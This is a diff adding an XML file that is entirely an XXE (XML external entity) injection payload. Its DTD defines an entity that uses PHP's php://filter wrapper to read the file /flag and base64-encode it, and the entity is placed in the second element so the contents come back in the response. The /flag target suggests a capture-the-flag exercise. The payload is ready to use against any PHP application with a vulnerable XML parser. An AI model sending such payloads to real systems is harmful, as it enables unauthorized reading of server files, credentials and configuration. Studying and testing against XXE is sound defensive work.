@@ -1,0 +1,13 @@
+<?xml version="1.0"?>  
+<!DOCTYPE root [  
+<!ELEMENT root (first, second, third)> 
+<!ELEMENT first (#PCDATA)>  
+<!ELEMENT second (#PCDATA)>  
+<!ELEMENT third (#PCDATA)>  
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">]>   
+<!-- Create a XML following the DTD -->  
+<root> 
+<first>1</first>  
+<second>&xxe;</second>  
+<third>World</third> 
+</root>
